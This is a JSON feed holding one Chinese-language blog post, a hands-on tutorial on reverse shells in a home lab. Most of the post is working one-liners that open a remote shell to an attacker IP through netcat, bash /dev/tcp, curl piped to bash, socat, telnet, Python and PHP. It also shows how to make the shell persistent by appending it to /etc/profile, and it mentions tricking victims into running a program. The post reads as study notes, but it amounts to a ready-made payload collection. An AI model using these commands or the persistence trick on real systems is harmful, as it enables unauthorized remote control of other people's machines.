{
    "version": "https://jsonfeed.org/version/1",
    "title": "Prism Port • All posts by \"reverse shell\" tag",
    "description": "",
    "home_page_url": "https://www.sycamore.top",
    "items": [
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%8F%8D%E5%BC%B9-shell/",
            "url": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%8F%8D%E5%BC%B9-shell/",
            "title": "反弹_shell",
            "date_published": "2022-04-23T13:48:27.000Z",
            "content_html": "<h1 id=\"什么是反弹shell\"><a class=\"anchor\" href=\"#什么是反弹shell\">#</a> 什么是反弹 shell？</h1>\n<p><strong>正向连接</strong>，就是攻击者用自己的<strong>攻击机</strong>连接到<strong>目标主机</strong>的某一端口，<strong>常见</strong>的有 web 服务、ssh、远程桌面等等。</p>\n<p>在<strong>实际情况</strong>下，总会有很多时候，我们<strong>不能</strong>通过正向连接访问到目标主机，这个时候就可以利用<strong>反向连接</strong>来实现。</p>\n<p><strong>反向连接</strong>，通俗来说就是，攻击者<strong>监听</strong>某个攻击机的指定端口，目标主机<strong>主动发起请求</strong>到该端口，并将<strong>命令行的输入输出</strong>转到攻击机上显示。</p>\n<h1 id=\"适用情况\"><a class=\"anchor\" href=\"#适用情况\">#</a> 适用情况</h1>\n<p>反弹 shell 适用于如下几种常见的情况：</p>\n<ul>\n<li>目标机因<strong>防火墙</strong>受限，目标机器只能发送请求，不能接收请求。\n<ul>\n<li>所以让目标机<strong>主动发送请求</strong>到攻击机指定端口来 <strong>getshell</strong><br />\n&lt;br&gt;</li>\n</ul>\n</li>\n<li>目标机端口<strong>被占用</strong>。\n<ul>\n<li>但是<strong>攻击机</strong>不会存在什么<strong>端口限制</strong><br />\n &lt;br&gt;</li>\n</ul>\n</li>\n<li>攻击者<strong>无法预知</strong>目标机什么时候会中病毒、木马，对方的网络环境是什么样的，什么时候开关机。\n<ul>\n<li>所以采用 <strong>监听 + 诱骗目标机主动执行某程序</strong> 的方式获得 <strong>shell</strong><br />\n&lt;br&gt;</li>\n</ul>\n</li>\n<li>虽然目标机中了招，但是目标机位于<strong>局域网</strong>，或 IP 会<strong>动态变化</strong>。\n<ul>\n<li>不能获得<strong>可用的 IP</strong> 地址</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"实现方式\"><a class=\"anchor\" href=\"#实现方式\">#</a> 实现方式</h1>\n<p>反弹 shell 的方式有很多，那具体要用哪种方式还需要根据 目标主机的<strong>环境</strong> 来确定，<br />\n比如：</p>\n<ul>\n<li>如果有 <strong>netcat</strong> 或者 <strong>Socat</strong> 或者 <strong>Telnet</strong> 工具，那么可以利用 <strong>任意这三者之一</strong> 反弹 shell，</li>\n<li>如果 <strong>bash</strong> 可用，那么可以利用 bash 反弹 shell，</li>\n<li>如果具有 <strong>python</strong> 或者 <strong>php</strong> 的环境，那么可以利用 <strong>这些语言的脚本</strong> 反弹 shell。</li>\n</ul>\n<h2 id=\"利用-netcat-反弹shell\"><a class=\"anchor\" href=\"#利用-netcat-反弹shell\">#</a> 利用 netcat 反弹 shell</h2>\n<p><strong>Netcat</strong>（即 <strong>nc</strong> ） 是一款简单的 Unix 工具，使用 UDP 和 TCP 协议。它可以轻易的建立任何连接。</p>\n<h3 id=\"准备\"><a class=\"anchor\" href=\"#准备\">#</a> 准备：</h3>\n<p>目前，默认的各个 <strong>linux</strong> 发行版本已经自带了 <strong>netcat</strong> 工具包。</p>\n<p>但是有部分版本的 <strong>netcat</strong> 的 <strong>-e</strong> 功能 被阉割了<br />\n（大概是出于安全考虑，因为 <strong>-e</strong> 可以直接发布与反弹本地 <strong>shell</strong>）</p>\n<p>对于这种情况，需要<strong>手动下载安装包</strong>，命令如下：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://jaist.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class=\"line\">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class=\"line\">./configure</span><br><span class=\"line\">make &amp;&amp; make install</span><br><span class=\"line\">make clean</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"攻击机开启监听\"><a class=\"anchor\" href=\"#攻击机开启监听\">#</a> 攻击机开启监听：</h3>\n<blockquote>\n<p>格式： <code>nc -lvvp &lt;攻击机监听的端口&gt;</code></p>\n</blockquote>\n<p><code>netcat -lvvp 23333</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443777/Typera/2023/04/074dea0aeb65e3cf991579314a98284c.png\" alt=\"image-20230426012933906\" /></p>\n<h3 id=\"目标机主动连接攻击机\"><a class=\"anchor\" href=\"#目标机主动连接攻击机\">#</a> 目标机主动连接攻击机：</h3>\n<blockquote>\n<p>格式： <code>nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</code></p>\n</blockquote>\n<p><code>netcat 192.168.158.139 23333 -e /bin/bash</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443773/Typera/2023/04/f52bbdd3389beb7c7a9e9da72e220e40.png\" alt=\"image-20230426012929850\" /></p>\n<p>（<strong>必须</strong>攻击机<strong>先</strong>开始 <strong>监听</strong>，目标机<strong>再反弹 shell</strong>，这样才会有效果）</p>\n<p>成功反弹 shell：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443770/Typera/2023/04/9284a9b2e6290d96a8b65313b24f91a3.png\" alt=\"image-20230426012926374\" /></p>\n<h2 id=\"利用-bash-反弹-shell\"><a class=\"anchor\" href=\"#利用-bash-反弹-shell\">#</a> 利用 Bash 反弹 shell</h2>\n<p>使用 Bash 中 <strong>网络重定向</strong> 的方法</p>\n<h3 id=\"准备-2\"><a class=\"anchor\" href=\"#准备-2\">#</a> 准备：</h3>\n<p>Kali Linux 中使用的 <strong>Shell</strong> 是 <strong>zsh</strong>，<br />\n可以用命令： <code>echo %SHELL</code>  查看当前系统使用的 <strong>Shell</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443763/Typera/2023/04/8d5285fdf9ee6db10ebba4ce645ad92c.png\" alt=\"image-20230426012919215\" /></p>\n<p>所以我们需要更换 Shell：</p>\n<ul>\n<li>更换： <code>chsh -s /bin/bash</code></li>\n<li>重启： <code>reboot</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443759/Typera/2023/04/a9c9ebe071eae7546dacb18ebc0bb277.png\" alt=\"image-20230426012915317\" /></li>\n</ul>\n<p><strong>[注意]：</strong> 出现下图错误只是因为 <strong>攻击机 没开监听</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443751/Typera/2023/04/8854676b35906672629c5fc26ad8a02f.png\" alt=\"image-20230426012907770\" /></p>\n<p>另外，Debian 中，部分版本可能默认<strong>没开</strong> bash 的 网络重定向 选项，</p>\n<p>对于这种情况，我们只能：加上 <code>--enable-net-redirections</code>  <strong>重新编译 bash</strong><br />\n 详见我的另一篇文章：<a href=\"\">【从源码重新编译 Bash：重定向功能】</a></p>\n<h3 id=\"命令\"><a class=\"anchor\" href=\"#命令\">#</a> 命令：</h3>\n<p>（攻击机<strong>事先</strong>开启 本地监听）</p>\n<blockquote>\n<p>格式： <code>bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</code></p>\n</blockquote>\n<p><code>bash -i &gt;&amp; /dev/tcp/192.168.158.139/23333 0&gt;&amp;1</code></p>\n<p><strong>成功反弹 shell：</strong><br />\n<strong>目标机</strong> 界面 (反弹)：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443746/Typera/2023/04/c693896f2e2fa73809cee178b0f6533b.png\" alt=\"image-20230426012903048\" /></p>\n<p><strong>攻击机</strong> 界面 (监听)：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443743/Typera/2023/04/6fb9f5e48c00f60ba91673a9f6c734eb.png\" alt=\"image-20230426012858851\" /></p>\n<h3 id=\"详细解释\"><a class=\"anchor\" href=\"#详细解释\">#</a> 详细解释：</h3>\n<ul>\n<li><code>bash -i</code>\n<ul>\n<li>产生一个 <strong>bash</strong> 交互环境。</li>\n</ul>\n</li>\n<li><code>&gt;&amp;</code>\n<ul>\n<li>把联合符号 前面 的内容与 后面 相结合，然后一起<strong>重定向</strong>给后者。</li>\n</ul>\n</li>\n<li><code>/dev/tcp/192.168.158.139/23333</code>\n<ul>\n<li><code>/dev/tcp/ip/port</code>  是 <strong>bash</strong> 中定义的一个方法，</li>\n<li>作用是：让攻击机 (192.168.158.139) 和目标机，在攻击机的 23333 端口上，建立一个 <strong>tcp</strong> 连接。</li>\n</ul>\n</li>\n<li><code>0&gt;&amp;1</code>\n<ul>\n<li>0、1 为<strong>文件描述符</strong>。</li>\n<li>即将 <strong>标准输入 (0)</strong> 与 <strong>标准输出 (1)</strong> 的内容相结合，然后<strong>重定向</strong>给前面 <strong>标准输出 (1)</strong> 的内容。（在反弹 shell 中实现 <strong>输入输出</strong> 的关键）</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"curl-配合-bash\"><a class=\"anchor\" href=\"#curl-配合-bash\">#</a> Curl 配合 Bash</h3>\n<p>丰富一下用 Bash 反弹 Shell 的手段<br />\n（Curl 的命令借助了 Linux 中的管道）</p>\n<h4 id=\"1-准备-indexphp-文件\"><a class=\"anchor\" href=\"#1-准备-indexphp-文件\">#</a> 1. 准备 index.php 文件：</h4>\n<p>攻击机中创建  <code>index.php</code>  文件，<br />\n填写的<strong>内容</strong>为：直接使用  <code>Bash</code>  反弹 <strong>Shell</strong> 的情况下，目标机中运行的命令，即：</p>\n<blockquote>\n<p>bash -i &gt;&amp; /dev/tcp/192.168.158.139/23333 0&gt;&amp;1</p>\n</blockquote>\n<p><strong>存放</strong>在 <strong>web</strong> 目录下，<br />\n演示的 <strong>Kali Linux</strong> 虚拟机开启 <strong>Apache2</strong> 服务之后，对应目录为： <code>/var/www/html/</code></p>\n<p>开启 <strong>Apache2</strong> 服务之后，会在上述目录下生成一个  <code>index.php</code>  文件，<br />\n可以直接删去内容并 <strong>修改</strong>，该文件只是生成一个 <strong>web</strong> 页面而已（如下图）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443737/Typera/2023/04/97eb1b3565e6f8745bf100a9b5ee31ed.png\" alt=\"image-20230426012853268\" /></p>\n<h4 id=\"2-攻击机打开-23333-端口的监听\"><a class=\"anchor\" href=\"#2-攻击机打开-23333-端口的监听\">#</a> 2. 攻击机打开 23333 端口的监听</h4>\n<p>命令： <code>netcat -lvvp 23333</code></p>\n<h4 id=\"3-目标机输入-curl-命令反弹-shell\"><a class=\"anchor\" href=\"#3-目标机输入-curl-命令反弹-shell\">#</a> 3. 目标机输入 Curl 命令反弹 shell</h4>\n<p>命令： <code>curl 192.168.158.139|bash</code></p>\n<p>实现如图：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443723/Typera/2023/04/66bf859ff6c462a364624b51a215fd64.png\" alt=\"image-20230426012839981\" /></p>\n<p>成功反弹 <strong>Shell</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443715/Typera/2023/04/01742775f569ce91fa25a5f8f25ed544.png\" alt=\"\" /></p>\n<h3 id=\"bash-反弹命令写入-etcprofile-文件\"><a class=\"anchor\" href=\"#bash-反弹命令写入-etcprofile-文件\">#</a> Bash 反弹命令写入 /etc/profile 文件</h3>\n<p>文件  <code>/etc/profile</code>  中的内容，会在 <strong>Bash</strong> 窗口打开时执行。</p>\n<h4 id=\"如图\"><a class=\"anchor\" href=\"#如图\">#</a> 如图：</h4>\n<blockquote>\n<p>（下图中我输入的是<strong>错误的代码</strong>，所以<strong>启动 Bash</strong> 之后，会<strong>输出报错</strong>内容到命令行）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443705/Typera/2023/04/92211d839dd171dc8f115e037f1e07eb.png\" alt=\"image-20230426012821415\" /><br />\n（如果是<strong>正确的代码</strong>，但是攻击侧<strong>没开监听</strong>，也会报错，如下图：）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443709/Typera/2023/04/566b0ca11a943f96d0bf550e848d84d4.png\" alt=\"image-20230426012825282\" /></p>\n</blockquote>\n<h4 id=\"布置的步骤\"><a class=\"anchor\" href=\"#布置的步骤\">#</a> 布置的步骤：</h4>\n<p>通过  <code>vim /etc/profile</code> ，编辑文件：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443699/Typera/2023/04/6a8db3c08c0188c7b0a9b1d25fed3c50.png\" alt=\"image-20230426012816962\" /><br />\n&lt;br&gt;</p>\n<ul>\n<li>在末尾添加代码： <code>/bin/bash -i &gt;&amp; /dev/tcp/192.168.158.139/23333 0&gt;&amp;1 &amp;</code></li>\n</ul>\n<blockquote>\n<p>该命令比直接反弹的代码在 <strong>末尾</strong> 多了一个 <strong>&amp;</strong>，<br />\n这是为了让打开 <strong>Bash</strong> 的用户能正常使用</p>\n</blockquote>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443696/Typera/2023/04/bf591833811a31c67bcfb2741ab7ca30.png\" alt=\"image-20230426012812596\" /></p>\n<p><strong>演示：</strong></p>\n<ul>\n<li>攻击机开始监听 23333 端口</li>\n<li><strong>Xshell</strong> 打开目标机的会话（即<strong>启动了 Bash</strong>）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443691/Typera/2023/04/1fe57f518c02b5c5651dc8fbfe3269c7.png\" alt=\"image-20230426012807425\" /></li>\n<li>没有回显，且攻击机<strong>成功 getshell</strong>，<strong>反弹成功</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443688/Typera/2023/04/5d329939a4e8d82c53c712f4b54adb09.png\" alt=\"image-20230426012804072\" /></li>\n</ul>\n<h2 id=\"利用-socat-反弹-shell\"><a class=\"anchor\" href=\"#利用-socat-反弹-shell\">#</a> 利用 Socat 反弹 Shell</h2>\n<p><strong>Socat</strong> 是 <strong>Linux</strong> 下一个多功能的网络工具，功能与 <strong>netcat (nc)</strong> 类似。<br />\n所以我们也可以使用 <strong>Socat</strong>，开监听、反弹 <strong>Shell</strong></p>\n<h3 id=\"下载-socat\"><a class=\"anchor\" href=\"#下载-socat\">#</a> 下载 Socat</h3>\n<p>试验之前，要先下载 <strong>Socat</strong>（<strong>Kali Linux</strong> 已经<strong>预装</strong>了该工具），<br />\n如果没有安装，使用命令： <code>apt-get install socat</code></p>\n<h3 id=\"攻击机开启监听-2\"><a class=\"anchor\" href=\"#攻击机开启监听-2\">#</a> 攻击机开启监听</h3>\n<p>命令： <code>socat TCP-LISTEN:23333 -</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443682/Typera/2023/04/f6ffc230be89565c17383bbe1e8262a3.png\" alt=\"image-20230426012759404\" /></p>\n<h3 id=\"目标机通过-socat-建立连接\"><a class=\"anchor\" href=\"#目标机通过-socat-建立连接\">#</a> 目标机通过 Socat 建立连接</h3>\n<p>命令： <code>socat tcp-connect:192.168.158.139:23333 exec:'bash -li',pty,stderr,setsid,sigint,sane</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443678/Typera/2023/04/00614ff7b3a1a2dfdfbad02dc0df8be1.png\" alt=\"image-20230426012754642\" /></p>\n<p><strong>成功</strong> 反弹 <strong>Shell</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443674/Typera/2023/04/7b31e1aa07c5c4bdcbd9e6cafad1655a.png\" alt=\"image-20230426012750258\" /></p>\n<h2 id=\"利用-telnet-反弹-shell\"><a class=\"anchor\" href=\"#利用-telnet-反弹-shell\">#</a> 利用 Telnet 反弹 Shell</h2>\n<p>我们总会遇到，目标机 <strong>Netcat</strong> 和  <code>/dev/tcp/</code>  方法不可用的情况，<br />\n这时候如果 目标机配有 <strong>Telnet</strong> 服务，我们可以用 <strong>Telnet</strong> 建立反向连接。</p>\n<ul>\n<li>攻击机开启监听<br />\n（用 <strong>nc</strong> 或者 <strong>socat</strong> 都行）</li>\n<li>目标机执行命令，建立连接：<br />\n <code>mknod a p; telnet 47.xxx.xxx.72 2333 0&lt;a | /bin/bash 1&gt;a</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443663/Typera/2023/04/db443fe2827a018ce3cb046f63793326.png\" alt=\"image-20230426012739427\" /></li>\n<li>成功获得 <strong>反弹 Shell</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443657/Typera/2023/04/d3d507d38eb37d836868b42d5f90db17.png\" alt=\"image-20230426012732507\" /></li>\n</ul>\n<h2 id=\"用-python-脚本反弹-shell\"><a class=\"anchor\" href=\"#用-python-脚本反弹-shell\">#</a> 用 Python 脚本反弹 Shell</h2>\n<p>使用 <strong>Python</strong> 的 <strong>socket</strong> 库</p>\n<p>攻击机开启监听后，直接使用命令：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.158.139&quot;,23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><br />\n（或者也可以转化成 .py 的 Python 文件，然后命令行执行）</p>\n<p>如下图所示：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443651/Typera/2023/04/ff1cae7c81c0b04929f2c86b0e788c9e.png\" alt=\"image-20230426012727025\" /><br />\n 成功反弹 <strong>Shell</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443647/Typera/2023/04/6826b2f0cec7b82a3677a2e1e86de378.png\" alt=\"image-20230426012721830\" /></p>\n<h2 id=\"用-php-脚本反弹-shell\"><a class=\"anchor\" href=\"#用-php-脚本反弹-shell\">#</a> 用 php 脚本反弹 Shell</h2>\n<p>攻击侧开启监听，目标机执行的 php 脚本如下：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r &#x27;$sock=fsockopen(&quot;192.168.158.139&quot;,23333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><br />\n 实现如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443639/Typera/2023/04/fdd3929e8cec1fc5e67af1614f47d9b4.png\" alt=\"image-20230426012715771\" /><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443627/Typera/2023/04/c830f507fd2cc729beb4e10b7a5d18cd.png\" alt=\"image-20230426012702683\" /></p>\n<h2 id=\"最后\"><a class=\"anchor\" href=\"#最后\">#</a> 最后</h2>\n<p>逐一实现了这么多的 <strong>反弹 Shell</strong> 的方法，我发现他们本质上都是一致的。</p>\n<p>无论是用工具还是脚本，都是 建立连接 + 输入输出重定向。</p>\n<p>总得来说，这样一遍下来，最开始读起来较为模糊的原理，现在也能够清晰地理解了。</p>\n",
            "tags": [
                "Linux",
                "Kali",
                "Reverse Shell"
            ]
        }
    ]
}